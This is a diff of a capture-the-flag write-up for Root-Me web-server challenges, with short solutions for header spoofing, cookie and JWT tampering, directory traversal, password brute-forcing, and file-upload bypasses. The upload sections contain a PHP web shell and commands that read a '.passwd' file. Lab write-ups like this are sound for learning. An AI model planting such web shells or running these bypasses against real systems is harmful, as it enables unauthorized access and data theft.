@@ -6,11 +6,11 @@ description: 'Note : A JOURNEY TO GAIN KNOWLEDGE'
 
 ## Web - Server
 
-### [HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)
+### 1.[HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)
 
 F12 for flag
 
-### [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)
+### 2.[HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)
 
 ``[`document`](https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c)``
 
@@ -22,7 +22,7 @@ Change IP at client to private IP by adding _**an X-Forwarded-For**_ header
 
 ![](<../.gitbook/assets/image (13) (2).png>)
 
-### [HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)
+### 3.[HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)
 
 ![](<../.gitbook/assets/image (35).png>)
 
@@ -30,13 +30,13 @@ It combines URL and hash md5 of that one, so that we just put other URL and hash
 
 ![](<../.gitbook/assets/image (29) (1).png>)
 
-### HTTP - User-agent
+### 4.HTTP - User-agent
 
 change User-Agent to \`admin\`
 
 ![](<../.gitbook/assets/image (18).png>)
 
-### Weak password
+### 5.Weak password
 
 ```
 import requests
@@ -58,7 +58,7 @@ for pwd in words:
 
 ![](<../.gitbook/assets/image (39).png>)
 
-### PHP - Command injection
+### 6.PHP - Command injection
 
 ![](<../.gitbook/assets/image (32) (2).png>)
 
@@ -66,7 +66,7 @@ for pwd in words:
 
 ``[`document`](https://portswigger.net/web-security/os-command-injection)``
 
-### Backup file
+### 7.Backup file
 
 Use dirsearch find some interesting files:
 
@@ -74,7 +74,7 @@ Use dirsearch find some interesting files:
 
 > /web-serveur/ch11/index.php\~
 
-### HTTP - Directory indexing
+### 8.HTTP - Directory indexing
 
 > [http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt](http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt)
 >
@@ -82,7 +82,7 @@ Use dirsearch find some interesting files:
 
 ![](<../.gitbook/assets/image (5) (3).png>)
 
-### HTTP - Headers
+### 9.HTTP - Headers
 
 With normal request we will get:
 
@@ -94,17 +94,17 @@ add Header to request:
 
 ![](<../.gitbook/assets/image (32).png>)
 
-### HTTP - POST
+### 10.HTTP - POST
 
-![](<../.gitbook/assets/image (2).png>)
+![](<../.gitbook/assets/image (2) (3).png>)
 
-### HTTP - Improper redirect
+### 11.HTTP - Improper redirect
 
 Capture before it redirect
 
-![](<../.gitbook/assets/image (3).png>)
+![](<../.gitbook/assets/image (3) (1).png>)
 
-### HTTP - Verb tampering
+### 12.HTTP - Verb tampering
 
 Ban đầu tưởng bruteforce ngồi xài hydra và cái rockyou.txt ra spam cả tiếng&#x20;
 
@@ -114,7 +114,7 @@ temper ở đây là chỉ cần đổi method khác ngoài GET và POST là đ�
 
 ![](<../.gitbook/assets/image (10).png>)
 
-### File upload - Double extensions
+### 13.File upload - Double extensions
 
 ```
 <?php echo shell_exec($_GET['cmd']); ?>
@@ -128,7 +128,7 @@ set file.php.png and send to the server
 ?cmd=cd;cat .passwd
 ```
 
-### File upload - MIME type
+### 14.File upload - MIME type
 
 ![](../.gitbook/assets/image.png)
 
@@ -138,33 +138,50 @@ Change Content-Type to image/png and rce
 ?id=cd;cat .passwd
 ```
 
-### HTTP - Cookies
+### 15.HTTP - Cookies
 
-![chan](<../.gitbook/assets/image (1).png>)
+![chan](<../.gitbook/assets/image (1) (1).png>)
 
 change cookie from `visiteur` to `admin`
 
-### JSON Web Token (JWT) - Introduction
+### 16.JSON Web Token (JWT) - Introduction
 
 ![](<../.gitbook/assets/image (45).png>)
 
 "none" signature algorithms
 
-### Directory traversal
+### 17.Directory traversal
 
 ![](<../.gitbook/assets/image (7).png>)
 
 Try with ../ and fuzz
 
-### JSON Web Token (JWT) - Weak secret
+### 18.JSON Web Token (JWT) - Weak secret
 
 ![](<../.gitbook/assets/image (46).png>)
 
 bruteforce secret key: lol
 
-![sign new signature](<../.gitbook/assets/image (4).png>)
+![sign new signature](<../.gitbook/assets/image (4) (1).png>)
 
 POST and look for the flag hm....
 
 ![](<../.gitbook/assets/image (11).png>)
 
+### 19.File upload - Null byte
+
+create: `file.php%0a.png`
+
+```
+<?php echo shell_exec('id'); ?>
+```
+
+![](<../.gitbook/assets/image (2).png>)
+
+![](<../.gitbook/assets/image (6).png>)
+
+### 20.Install files
+
+use dirsearch: /web-serveur/ch6/phpbb/install
+
+![](<../.gitbook/assets/image (8).png>)
